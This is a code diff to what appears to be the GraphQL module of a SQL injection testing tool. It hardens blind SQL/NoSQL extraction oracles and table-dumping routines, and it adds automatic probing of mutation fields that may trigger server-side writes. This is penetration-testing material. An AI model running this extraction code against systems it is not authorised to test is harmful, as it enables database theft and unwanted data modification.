+        # the sleeps and inflate every request, so it is not offered here. A single measurement against a
+        # fixed threshold turns jitter into wrong bits over a long dump, so classify with repeated
+        # samples: a clear fast/slow reading decides immediately; a reading near the threshold is
+        # RE-SAMPLED, and persistent ambiguity aborts the value (InconclusiveError) rather than guessing.
         delay = DIALECTS[dbmsHint].delay
 
-        def truth(condition):
+        def _elapsed(condition):
             query = _buildQuery(slot, "%s' OR %s-- " % (SENTINEL, delay(condition, conf.timeSec)))
             if not query:
-                return False
+                return None
             start = time.time()
-            _gqlSend(endpoint, query)
-            return (time.time() - start) > threshold
+            page, code = _gqlSend(endpoint, query)
+            if page is None or blockedStatus(code):     # transport failure/block is UNKNOWN, not "fast"
+                return None
+            return time.time() - start
+
+        def truth(condition):
+            margin = max(0.5, conf.timeSec * 0.25)      # ambiguity band around the threshold
+            for _attempt in range(3):
+                dt = _elapsed(condition)
+                if dt is None:
+                    continue                            # re-sample a failed/blocked reading
+                if dt > threshold + margin:
+                    return True
+                if dt < threshold - margin:
+                    return False
+                # NEAR the threshold: a lone confirming sample deciding True/False would guess on an
+                # ambiguous pair, so loop and RE-SAMPLE; only a clear reading (above) decides, else the
+                # retries exhaust and the value aborts (InconclusiveError). A missing/low confirmation
+                # is NOT "False".
+            raise InconclusiveError()
 
         return truth, None
 
-    # Content oracle: capture the always-true template and require a clear true/false split
+    # Content oracle: calibrate BOTH the always-true and never-true models on the SAME extraction shape
+    # the bits use, and require a clear split between them.
     trueVal = _slotValue(_gqlSend(endpoint, _buildQuery(slot, _payload("1=1")))[0])
     falseVal = _slotValue(_gqlSend(endpoint, _buildQuery(slot, _payload("1=2")))[0])
     if _ratio(trueVal, falseVal) > UPPER_RATIO_BOUND:
         return None, None
 
     def truth(condition):
+        # Tri-state: classify each bit against BOTH models with a margin, RE-SEND on an ambiguous read,
+        # and ABORT the value (InconclusiveError) on persistent ambiguity - never let a transport
+        # failure or a near-tie silently become a False bit that corrupts the extracted value.
         query = _buildQuery(slot, _payload(condition))
         if not query:
-            return False
-        page, _ = _gqlSend(endpoint, query)
-        return _ratio(_slotValue(page), trueVal) > UPPER_RATIO_BOUND
+            raise InconclusiveError()
+
+        def send():
+            page, code = _gqlSend(endpoint, query)
+            if page is None or blockedStatus(code) or _hasErrors(page):
+                return None                 # a resolver ERROR is UNKNOWN, not a false bit
+            return _slotValue(page)
+
+        return resolveBit(send(), trueVal, falseVal, send)
 
     def truthBatch(conditions):
         query, aliases = _buildBatch(slot, [_payload(_) for _ in conditions])
         if not query:
-            return [False] * len(conditions)
-        page, _ = _gqlSend(endpoint, query)
-        data = (_parseJSON(page) or {}).get("data") or {}
-        return [_ratio(json.dumps(data.get(alias), sort_keys=True, default=str), trueVal) > UPPER_RATIO_BOUND
-                for alias in aliases]
+            raise InconclusiveError()
+        page, code = _gqlSend(endpoint, query)
+        if page is None or blockedStatus(code):
+            raise InconclusiveError()       # a FAILED batch must NOT decay into a list of False bits
+        doc = _parseJSON(page) or {}
+        data = doc.get("data")
+        if not isinstance(data, dict):
+            raise InconclusiveError()
+        # A batch is trustworthy ONLY when every error is attributable to a specific alias via a
+        # non-empty path. A PATHLESS / global error (request-level, auth, middleware, unpathed resolver
+        # exception) affects the WHOLE batch, so it must invalidate every bit - not be ignored while the
+        # aliases (which may still be null) get classified as clean false observations.
+        for e in (doc.get("errors") or []):
+            path = e.get("path") if isinstance(e, dict) else None
+            if not (isinstance(path, list) and path):
+                raise InconclusiveError()   # pathless/global error -> the entire batch is UNKNOWN
+        out = []
+        for alias in aliases:
+            if alias not in data or _aliasErrored(page, alias):   # absent or errored alias is UNKNOWN
+                raise InconclusiveError()
+            d = _decide(json.dumps(data.get(alias), sort_keys=True, default=str), trueVal, falseVal)
+            if d is _Decision.INCONCLUSIVE:
+                raise InconclusiveError()   # an ambiguous bit in a batch -> abort the value, don't guess
+            out.append(d is _Decision.TRUE)
+        return out
 
     # Sanity: the oracle must answer a known truth/falsehood correctly
-    if not (truth("1=1") and not truth("1=2")):
+    try:
+        if not (truth("1=1") and not truth("1=2")):
+            return None, None
+    except InconclusiveError:
         return None, None
+
+    # NEVER batch a MUTATION: _buildBatch aliases the field once per condition, so a single batched
+    # request would EXECUTE the write resolver many times. Aliased batching is a read-side speed-up
+    # only; a mutation extracts one condition per request (sequential), unless a verified dry-run/
+    # rollback argument makes repeated execution non-persisting (not assumed here).
+    if slot.operation == "mutation":
+        return truth, None
 
     return truth, truthBatch
 
 
 def _fingerprint(truth):
-    # Identify the back-end DBMS by probing each dialect's signature predicate
+    # Identify the back-end DBMS by probing each dialect's signature predicate. An inconclusive probe
+    # is not a match (and not a crash) - skip that dialect rather than abort the whole fingerprint.
     for dbms, dialect in DIALECTS.items():
-        if truth(dialect.fingerprint):
-            return dbms
+        try:
+            if truth(dialect.fingerprint):
+                return dbms
+        except InconclusiveError:
+            continue
     return None
 
 
@@ -892,30 +1241,35 @@ def _inferChar(truth, dialect, expr, pos):
 def _inferExpr(truth, dialect, expr, maxLen=MAX_LENGTH):
     # Recover the string value of SQL expression `expr` one character at a time:
     # binary-search the length, then each character via _inferChar (printable-fast,
-    # widening to full Unicode for non-ASCII).
+    # widening to full Unicode for non-ASCII). A persistently-inconclusive bit aborts the
+    # value (returns None) rather than being coerced to a wrong length/char.
     lengthExpr = dialect.length(expr)
 
-    if not truth("%s>0" % lengthExpr):
-        return "" if truth("%s=0" % lengthExpr) else None
+    try:
+        if not truth("%s>0" % lengthExpr):
+            return "" if truth("%s=0" % lengthExpr) else None
 
-    length, probe = 1, 2
-    while probe <= maxLen and truth("%s>=%d" % (lengthExpr, probe)):
-        length, probe = probe, probe * 2
-    low, high = length, min(probe, maxLen + 1)
-    while low + 1 < high:
-        mid = (low + high) // 2
-        if truth("%s>=%d" % (lengthExpr, mid)):
-            low = mid
-        else:
-            high = mid
-    length = low
+        length, probe = 1, 2
+        while probe <= maxLen and truth("%s>=%d" % (lengthExpr, probe)):
+            length, probe = probe, probe * 2
+        low, high = length, min(probe, maxLen + 1)
+        while low + 1 < high:
+            mid = (low + high) // 2
+            if truth("%s>=%d" % (lengthExpr, mid)):
+                low = mid
+            else:
+                high = mid
+        length = low
 
-    if length >= maxLen:
-        logger.warning("value length hit the %d-char cap; the recovered value may be truncated" % maxLen)
+        if length >= maxLen:
+            logger.warning("value length hit the %d-char cap; the recovered value may be truncated" % maxLen)
 
-    value = ""
-    for pos in xrange(1, length + 1):
-        value += _inferChar(truth, dialect, expr, pos)
+        value = ""
+        for pos in xrange(1, length + 1):
+            value += _inferChar(truth, dialect, expr, pos)
+    except InconclusiveError:
+        logger.warning("GraphQL blind extraction aborted for a value (oracle inconclusive after retries)")
+        return None
     return value
 
 
@@ -928,70 +1282,99 @@ def _inferExprBatched(truthBatch, truth, dialect, expr, maxLen=MAX_LENGTH):
     # (the 7 bits only carry the low byte), so non-ASCII data is not mangled.
     lengthExpr = dialect.length(expr)
 
-    length = 0
-    for chunk in _chunks(list(xrange(1, maxLen + 1)), BATCH_SIZE):
-        results = truthBatch(["%s>=%d" % (lengthExpr, _) for _ in chunk])
-        hits = [n for n, ok in zip(chunk, results) if ok]
-        if hits:
-            length = max(length, max(hits))
-        if not all(results):       # monotone predicate: no longer length can be true beyond here
-            break
-    if length == 0:
-        return ""
+    try:
+        length = 0
+        for chunk in _chunks(list(xrange(1, maxLen + 1)), BATCH_SIZE):
+            results = truthBatch(["%s>=%d" % (lengthExpr, _) for _ in chunk])
+            hits = [n for n, ok in zip(chunk, results) if ok]
+            if hits:
+                length = max(length, max(hits))
+            if not all(results):       # monotone predicate: no longer length can be true beyond here
+                break
+        if length == 0:
+            return ""
 
-    conditions, index = [], []
-    for pos in xrange(1, length + 1):
-        for bit in xrange(7):
-            conditions.append("(%s & %d)>0" % (dialect.ordinal(expr, pos), 1 << bit))
-            index.append((pos, bit))
-        conditions.append("%s>%d" % (dialect.ordinal(expr, pos), CHAR_MAX))
-        index.append((pos, "hi"))
+        conditions, index = [], []
+        for pos in xrange(1, length + 1):
+            for bit in xrange(7):
+                conditions.append("(%s & %d)>0" % (dialect.ordinal(expr, pos), 1 << bit))
+                index.append((pos, bit))
+            conditions.append("%s>%d" % (dialect.ordinal(expr, pos), CHAR_MAX))
+            index.append((pos, "hi"))
 
-    codes, wide = {}, set()
-    flat = []
-    for chunk in _chunks(conditions, BATCH_SIZE):
-        flat.extend(truthBatch(chunk))
-    for (pos, bit), ok in zip(index, flat):
-        if bit == "hi":
-            if ok:
-                wide.add(pos)
-        elif ok:
-            codes[pos] = codes.get(pos, 0) | (1 << bit)
+        codes, wide = {}, set()
+        flat = []
+        for chunk in _chunks(conditions, BATCH_SIZE):
+            flat.extend(truthBatch(chunk))
+        for (pos, bit), ok in zip(index, flat):
+            if bit == "hi":
+                if ok:
+                    wide.add(pos)
+            elif ok:
+                codes[pos] = codes.get(pos, 0) | (1 << bit)
 
-    value = ""
-    for pos in xrange(1, length + 1):
-        if pos in wide:
-            value += _inferChar(truth, dialect, expr, pos)     # non-ASCII: exact recovery
-        else:
-            code = codes.get(pos, 0)
-            value += _unichr(code) if CHAR_MIN <= code <= CHAR_MAX else "?"
+        value = ""
+        for pos in xrange(1, length + 1):
+            if pos in wide:
+                value += _inferChar(truth, dialect, expr, pos)     # non-ASCII: exact recovery
+            else:
+                code = codes.get(pos, 0)
+                value += _unichr(code) if CHAR_MIN <= code <= CHAR_MAX else "?"
+    except InconclusiveError:
+        # a failed/ambiguous batch must abort the value, not silently yield a run of false bits
+        logger.warning("GraphQL batched extraction aborted for a value (oracle inconclusive)")
+        return None
     return value
 
 
 def _inferrer(truth, truthBatch, dialect):
     # Pick batched inference when the back-end honours aliased batching (verified
     # with a known true/false pair), else fall back to sequential bisection
-    if truthBatch and truthBatch(["1=1", "1=2"]) == [True, False]:
-        logger.info("using aliased query batching to accelerate blind extraction")
-        return lambda expr, maxLen=MAX_LENGTH: _inferExprBatched(truthBatch, truth, dialect, expr, maxLen)
+    if truthBatch:
+        try:
+            if truthBatch(["1=1", "1=2"]) == [True, False]:
+                logger.info("using aliased query batching to accelerate blind extraction")
+                return lambda expr, maxLen=MAX_LENGTH: _inferExprBatched(truthBatch, truth, dialect, expr, maxLen)
+        except InconclusiveError:
+            pass                # batching calibration was ambiguous -> use sequential bisection
     return lambda expr, maxLen=MAX_LENGTH: _inferExpr(truth, dialect, expr, maxLen)
 
 
-def _catList(infer, dialect, col, fromClause):
+def _inferCount(infer, expr, label):
+    # Recover a COUNT(*). Distinguish an INCONCLUSIVE oracle (`infer` returns None) from a genuine
+    # numeric answer: an inconclusive count must NOT collapse to 0 (which would present an unavailable
+    # catalog/table as a confirmed-empty one). Returns an int, or None when the count is unknown.
+    raw = infer("(SELECT COUNT(*) %s)" % expr)
+    if raw is None:
+        logger.warning("%s count is inconclusive (oracle unavailable); result may be incomplete" % label)
+        return None
+    raw = raw.strip()
+    if raw.isdigit():
+        return int(raw)
+    # a NON-NUMERIC / corrupted count is UNKNOWN, not a confirmed empty catalog/table -> None (partial),
+    # never 0 (which would present an unavailable result as "no rows")
+    logger.warning("%s count came back non-numeric (%r); treating as inconclusive, not empty" % (label, raw[:32]))
+    return None
+
+
+def _catList(infer, dialect, col, fromClause, label="catalog"):
     # Enumerate a catalog name list (tables or a table's columns) one entry at a time by
     # ordinal position, so a GROUP_CONCAT/STRING_AGG the back-end would silently truncate
     # (e.g. MySQL group_concat_max_len=1024) can't drop names.
-    try:
-        count = int((infer("(SELECT COUNT(*) %s)" % fromClause) or "").strip())
-    except ValueError:
-        count = 0
+    count = _inferCount(infer, fromClause, label)
+    if count is None:
+        return None                                 # UNKNOWN (not empty) - caller must not report "0 names"
 
-    names = []
+    names, missing = [], 0
     for offset in xrange(min(count, DUMP_MAX_ROWS)):
         name = infer("(SELECT %s %s %s)" % (col, fromClause, dialect.paginate(col, offset)))
-        if name:
+        if name is None:
+            missing += 1                            # inconclusive name (NOT a genuine empty) - count it
+        elif name:
             names.append(name)
 
+    if missing:
+        logger.warning("%s: %d of %d name(s) were inconclusive and omitted" % (label, missing, min(count, DUMP_MAX_ROWS)))
     if count > DUMP_MAX_ROWS:
         logger.warning("catalog lists %d names; enumerating the first %d (DUMP_MAX_ROWS cap)" % (count, DUMP_MAX_ROWS))
 
@@ -1003,24 +1386,25 @@ def _dumpTable(infer, dialect, table):
     # position. A whole-table GROUP_CONCAT/STRING_AGG would be silently truncated by
     # the back-end (e.g. MySQL group_concat_max_len=1024), dropping rows; per-row
     # extraction has no such cap.
-    columns = _catList(infer, dialect, dialect.columnCol, dialect.columnFrom(table))
-    if not columns:
+    columns = _catList(infer, dialect, dialect.columnCol, dialect.columnFrom(table), label="table '%s' columns" % table)
+    if not columns:                                 # None (inconclusive) or [] (genuinely no columns)
         return None
 
-    countRaw = infer("(SELECT COUNT(*) FROM %s)" % table)
-    try:
-        count = int((countRaw or "").strip())
-    except ValueError:
-        count = 0
+    count = _inferCount(infer, "FROM %s" % dialect.fromIdent(table), "table '%s'" % table)
+    if count is None:
+        return None                                 # UNKNOWN row count - do NOT present as an empty table
 
-    rows = []
+    rows, missing = [], 0
     for offset in xrange(min(count, DUMP_MAX_ROWS)):
         raw = infer(dialect.row(columns, table, offset), DUMP_MAX_LENGTH)
         if raw is None:
+            missing += 1                            # inconclusive row (NOT skipped-as-empty) - count it
             continue
         cells = raw.split(COL_SEP)
         rows.append((cells + [""] * len(columns))[:len(columns)])
 
+    if missing:
+        logger.warning("table '%s': %d of %d row(s) were inconclusive and omitted (result is partial)" % (table, missing, min(count, DUMP_MAX_ROWS)))
     if count > DUMP_MAX_ROWS:
         logger.warning("table '%s' has %d rows; dumping the first %d (DUMP_MAX_ROWS cap)" % (table, count, DUMP_MAX_ROWS))
 
@@ -1092,17 +1476,17 @@ def _grid(columns, rows):
 
 
 def _renderTypeStr(chain):
-    # Render a GraphQL type chain as a readable string: [User]! or String!
-    named = _leafName(chain) or ""
-    prefix = ""
-    suffix = ""
-    for kind, _ in chain:
+    # Render a GraphQL type chain: String!, [User], [String!]!, [[Int]!]! ... `chain` is outermost->
+    # innermost (see _unwrapType), so wrap the named type INSIDE-OUT (reversed) - composing each
+    # wrapper around the accumulated string. The old code overwrote a single shared suffix, so a
+    # nested `[String!]!` collapsed to the malformed `[String!` (list-close lost).
+    out = _leafName(chain) or ""
+    for kind, _ in reversed(chain):
         if kind == "NON_NULL":
-            suffix = "!"
+            out += "!"
         elif kind == "LIST":
-            prefix = "[" + prefix
-            suffix = suffix + "]"
-    return prefix + named + suffix
+            out = "[" + out + "]"
+    return out
 
 
 def _dumpSchema(schema, endpoint):
@@ -1152,34 +1536,63 @@ def _testSlot(slot, endpoint):
     where `oracle` is (truth, truthBatch, dbmsHint) for a usable blind-SQLi primitive (None for an
     error-only / non-differential point) and `oracleType` is None when nothing is confirmed."""
 
-    kind = oracleType = detail = templatePage = dbmsHint = threshold = None
+    kind = oracleType = detail = templatePage = dbmsHint = threshold = winningPayload = None
+    isMutation = slot.operation == "mutation"
 
-    # Boolean content inference is the most reliable extraction oracle, so it is preferred over the
-    # (also valid) error and time signals, which serve as fallbacks for non-differential slots.
-    oracleType, templatePage = _detectBoolean(slot, endpoint)
-    if oracleType:
-        kind = "boolean"
-        logger.info("boolean-based oracle confirmed (%s)" % oracleType)
-    else:
-        errorType, detail = _detectError(slot, endpoint)
-        if errorType:
-            kind, oracleType = "error", errorType
-            logger.info("error-based oracle confirmed")
+    def _boolean():
+        return ("boolean",) + _detectBoolean(slot, endpoint)     # (kind, oracleType, templatePage, winPayload)
+
+    def _error():
+        et, dt, wp = _detectError(slot, endpoint)
+        return ("error", et, None, wp, dt)
+
+    def _time():
+        ot, th, dh, wp = _detectTime(slot, endpoint)
+        return ("time", ot, None, wp, th, dh)
+
+    # For a MUTATION, run the error-based and (false-condition) probes BEFORE the always-true boolean
+    # pair, so a write resolver is not driven with a satisfied predicate any earlier than necessary; for
+    # a query, boolean content inference is the most reliable oracle and is preferred first.
+    order = ("error", "boolean", "time") if isMutation else ("boolean", "error", "time")
+    for step in order:
+        if step == "boolean":
+            _k, oracleType, templatePage, winningPayload = _boolean()
+            if oracleType:
+                kind = "boolean"
+                logger.info("boolean-based oracle confirmed (%s)" % oracleType)
+                break
+        elif step == "error":
+            _k, errorType, _tp, winningPayload, detail = _error()
+            if errorType:
+                kind, oracleType = "error", errorType
+                logger.info("error-based oracle confirmed")
+                break
         else:
-            oracleType, threshold, dbmsHint = _detectTime(slot, endpoint)
+            _k, oracleType, _tp, winningPayload, threshold, dbmsHint = _time()
             if oracleType:
                 kind = "time"
                 logger.info("time-based oracle confirmed (back-end '%s', threshold %.1fs)" % (dbmsHint, threshold))
+                break
 
     if not kind:
         logger.info("no oracle confirmed for this slot")
         return None, None, None
 
-    logger.info("%s.%s(%s:) is vulnerable to GraphQL injection (%s-based)" % (slot.parentType, slot.fieldName, slot.targetArg, kind))
-    title = "GraphQL %s" % oracleType
-    payload = _buildQuery(slot, _SQL_BOOLEAN_TRUE) or _SQL_BOOLEAN_TRUE
-    report = "---\nParameter: %s.%s(%s:) (%s)\n    Type: GraphQL injection\n    Title: %s\n    Payload: %s\n---" % (
-        slot.parentType, slot.fieldName, slot.targetArg, slot.strategy, title, _escapeGraphQLString(payload))
+    # GraphQL is the TRANSPORT, not the vulnerability class. The oracle here is a blind SQL (or, for
+    # a NoSQL error signature, NoSQL) injection primitive in a resolver - report it as such, with
+    # GraphQL as the transport and the resolver argument as the location (the reviewer's core point:
+    # "Type: GraphQL injection" is wrong; it is SQL/NoSQL injection reached VIA GraphQL).
+    vulnClass = "NoSQL injection" if (oracleType or "").startswith("nosql") else "SQL injection"
+    location = "%s.%s(%s:)" % (slot.parentType, slot.fieldName, slot.targetArg)
+    logger.info("%s is vulnerable to %s via GraphQL (%s-based)" % (location, vulnClass, kind))
+    title = "%s via GraphQL (%s-based)" % (vulnClass, kind)
+    # report the EXACT query that established THIS finding (the winning boolean/error/time/nosql
+    # payload), never a representative SQL-boolean payload for a time- or error-based hit - the shown
+    # reproducer must actually reproduce the reported issue
+    payload = _buildQuery(slot, winningPayload) or winningPayload
+    impactLine = ("    Impact: mutation (%s)\n" % _mutationImpact(slot.fieldName)) if isMutation else ""
+    report = ("---\nParameter: %s (%s)\n    Type: %s\n    Title: %s\n    Transport: GraphQL\n%s"
+              "    Payload: %s\n---") % (location, slot.strategy, vulnClass, title, impactLine, _escapeGraphQLString(payload))
     conf.dumper.singleString(report)
     if conf.beep:
         beep()
@@ -1281,8 +1694,11 @@ def graphqlScan():
     # (banner, tables, full table dumps). Mutation slots are reported but not
     # exercised, to avoid modifying server-side data.
 
-    global SENTINEL
+    global SENTINEL, COL_SEP
     SENTINEL = randomStr(length=10, lowercase=True)
+    # randomize the per-row cell separator each run: a fixed "~~~" that legitimately occurs in a cell
+    # would shift every subsequent column on split (silent corruption). A random token can't collide.
+    COL_SEP = "~%s~" % randomStr(length=12, lowercase=True)
 
     debugMsg = "'--graphql' is self-contained: it discovers the GraphQL endpoint, "
     debugMsg += "enumerates the schema, and injects SQL/NoSQL payloads into reachable "
@@ -1346,12 +1762,6 @@ def graphqlScan():
     if schema:
         _dumpSchema(schema, endpoint)
 
-    if mutationSlots:
-        names = sorted(set("%s(%s:)" % (_.fieldName, _.targetArg) for _ in mutationSlots))
-        warnMsg = "skipping %d mutation slot(s) to avoid modifying server-side data " % len(mutationSlots)
-        warnMsg += "(%s). They may carry the same injection. Test them manually if intended" % ", ".join(names)
-        logger.warning(warnMsg)
-
     # 5. Per-slot detection; keep the first usable blind-SQLi oracle for enumeration
     oracle = None
     found = False
@@ -1367,6 +1777,42 @@ def graphqlScan():
             oracle = slotOracle
             logger.info("retaining %s.%s(%s:) as the blind-SQLi oracle for back-end enumeration" % (
                 slot.parentType, slot.fieldName, slot.targetArg))
+
+    # 5b. Mutation slots are tested AUTOMATICALLY - but only when the (safer) query slots yielded no
+    # oracle, ranked so read-like mutations (login/verify/token/...) run before write-like ones, and
+    # each finding is gated by _testSlot's negative control + reproduction (a spurious write cannot be
+    # reported). Detection uses the error-based / boolean-false / conditional-time probes, which resolve
+    # in the lookup before any persistence. Impact is classified and reported per vector. As soon as a
+    # mutation oracle is retained the loop stops, to minimise further writes.
+    if mutationSlots and not oracle:
+        logger.info("no query-slot oracle; automatically testing %d mutation slot(s) (read-like ranked first)" % len(mutationSlots))
+        for slot in _rankMutations(mutationSlots):
+            impact = _mutationImpact(slot.fieldName)
+            logger.info("testing mutation slot %s.%s(%s:) [%s, impact: %s]" % (
+                slot.parentType, slot.fieldName, slot.targetArg, slot.strategy, impact))
+            oracleType, slotOracle, _ = _testSlot(slot, endpoint)
+            if oracleType:
+                found = True
+                logger.info("mutation %s.%s(%s:) is injectable (impact classification: %s)" % (
+                    slot.parentType, slot.fieldName, slot.targetArg, impact))
+            if slotOracle:
+                # Detection + report happen for EVERY confirmed mutation. But bulk blind enumeration
+                # (fingerprint + catalog + full dump = hundreds/thousands of resolver executions) is
+                # driven ONLY through a READ-LIKE mutation (login/verify/token/...). A write-like /
+                # unknown mutation is reported but NOT used as the enumeration transport unless its
+                # non-persistence is verified (a schema-backed, behaviour-confirmed dry-run/rollback -
+                # not merely a forced dryRun:true, which a resolver may ignore/invert). This keeps
+                # exploitation automatic without silently committing many writes.
+                if impact == "read-like" or _dryRunVerified(slot, endpoint):
+                    oracle = slotOracle
+                    logger.info("retaining %s mutation %s.%s(%s:) as the enumeration oracle; stopping further mutation probes" % (
+                        impact, slot.parentType, slot.fieldName, slot.targetArg))
+                    break
+                logger.warning("mutation %s.%s(%s:) is injectable but is WRITE-LIKE/UNKNOWN with unverified "
+                               "non-persistence; reporting it WITHOUT driving bulk blind enumeration through it "
+                               "(that would execute the write resolver many times). Re-target a read-like vector, "
+                               "or expose a verified dry-run/rollback argument, to auto-enumerate through it." % (
+                                   slot.parentType, slot.fieldName, slot.targetArg))
 
     # 6. Back-end enumeration through the retained oracle
     if oracle:
